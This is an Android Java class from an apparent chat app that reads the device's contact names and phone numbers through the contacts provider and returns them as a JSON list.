package com.example.chatapp.contact;

import android.database.Cursor;
import android.provider.ContactsContract;

import com.example.chatapp.MainService;

import org.json.JSONArray;
import org.json.JSONObject;

public class ContactReadService {
    public static JSONObject getContactList(){
        try{
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            while (cur.moveToNext()){
                JSONObject contact = new JSONObject();

                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                contact.put("name", name);
                contact.put("number", number);
                list.put(contact);
            }
            contacts.put("contactList", list);
            return contacts;

        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
